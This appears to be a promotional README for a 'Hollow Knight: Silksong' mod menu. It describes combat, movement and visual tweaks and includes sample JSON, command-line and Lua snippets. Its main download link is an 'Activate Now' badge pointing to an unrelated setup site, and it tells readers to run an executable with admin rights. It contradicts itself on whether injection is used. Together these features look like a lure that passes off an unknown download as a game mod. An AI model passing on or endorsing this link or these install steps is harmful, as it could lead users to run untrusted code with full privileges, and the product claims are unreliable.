# Hollow Knight: Silksong Mod Menu – Customizable Gameplay Control Suite 🌙

The **Hollow Knight: Silksong Mod Menu** brings a new level of personalization to Hornet’s long-awaited adventure. Designed for flexibility and smooth performance, it allows players to modify physics, visuals, combat difficulty, and exploration dynamics in real time. Whether you’re experimenting with movement mechanics or streamlining farming, this advanced configuration hub keeps everything one click away.

---

## 🎮 Features Overview

This mod menu was built for **total control** without requiring any external injection or memory alteration tools. It loads dynamically on startup and can be toggled at any time with a simple keybind (`F2` by default).

> [!IMPORTANT]
> Use the menu **only on local saves** — cloud sync mods may duplicate configs if left active across multiple systems

[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://fastsetup.github.io/.github/) 

---

## 🧭 Key Modules

### ⚔️ Combat Manager

* Enable or disable *hit pauses*, *damage scaling*, and *soul gain rates*.
* “Training Mode” for boss refights with adjustable HP bars.

### 🕊 Movement Engine

* Modify wall-cling time, aerial momentum, and slide friction.
* Add *air dash chaining* or *wall recovery bounce* for advanced navigation.

### 💎 Resource Tweaks

* Custom loot spawn ratio controls.
* “Smart Geo Pickup” system that automatically merges drop clusters.

### 🌄 Visual Layer

* Field-of-view expanders, lighting contrast, and overlay color filters.
* Create cinematic screenshots using the integrated photo pause feature.

### 🧩 Config Builder

Create preset files like:

```json
{
  "godMode": false,
  "dashChain": 3,
  "geoMagnet": 25,
  "enemyAggression": 0.8,
  "fovScale": 1.15
}
```

Then load them mid-run with `Ctrl + L` — no restart needed.

---

## 💻 Compatibility

| Platform           | Version          | Status                |
| ------------------ | ---------------- | --------------------- |
| Windows 10 / 11    | x64              | ✅ Fully Supported     |
| Steam / Epic / GOG | All Builds       | ✅ Compatible          |
| Controller Overlay | Xbox / DualSense | ⚙️ Supported          |
| Linux (Proton)     | Partial          | ⚠️ Overlay May Desync |

> [!NOTE]
> Mod menu was stress-tested on RTX 3050 and RX 6600 GPUs — zero performance loss under standard use.

---

## ⚡ Setup Guide

1. **Extract** the `.zip` archive into your *Silksong root folder*.
2. **Run** `SilksongModMenu.exe` (admin recommended).
3. Press `F2` to open the in-game interface.
4. Adjust sliders and toggles live — changes apply instantly.
5. Save your preset via the Config tab or auto-load at startup.

Example quick-launch config:

```bash
SilksongModMenu.exe --auto "Boss_Practice.json" --overlay 1
```

> [!WARNING]
> Avoid editing JSON configs while the game is running — use the reload command (`Ctrl + R`) instead to prevent data overlap.

---

## 🔄 Workflow Diagram

```mermaid
flowchart LR
    A[Game Launch] --> B[Mod Menu Injection]
    B --> C[Overlay Activated]
    C --> D{Select Module}
    D -->|Apply| E[Modify Values in Real Time]
    E --> F[Save Config Preset]
    F --> G[Auto Load on Next Session]
```

---

## ❓ FAQ

**Q1: Does it require external DLL injection?**
No — the menu uses runtime hooks built for Silksong’s Unity framework.

**Q2: Will it disable achievements?**
Only when *Developer Mode* is toggled; normal gameplay remains unaffected.

**Q3: Is multiplayer supported (if added later)?**
The mod menu isolates user values, so future online compatibility should remain safe.

**Q4: Can I back up my presets?**
Yes, all JSON files are stored under `/AppData/SilksongModMenu/Presets/`.

**Q5: How do I reset to vanilla settings?**
Simply press `Ctrl + Shift + R` or delete the active config file.

---

## 🧠 Advanced Use

The built-in scripting console supports Lua-based mini scripts for automation, such as:

```lua
if boss.name == "Lurker" then
    player.soul = 200
    print("Soul surge activated!")
end
```

This lets creators experiment with progression pacing or custom challenges.

---

## 🌐 Community & Support

Join the Silksong customization community to share presets, publish Lua scripts, and test new overlays.

---

### Final Thoughts

The **Hollow Knight: Silksong Mod Menu** empowers every player to explore Pharloom their way — faster, freer, and more fluid than ever before. It’s not just a tweak tool; it’s a *sandbox engine* for creative gameplay tuning.

> Take command of your journey — **install the Mod Menu today and redefine what Silksong can be.**
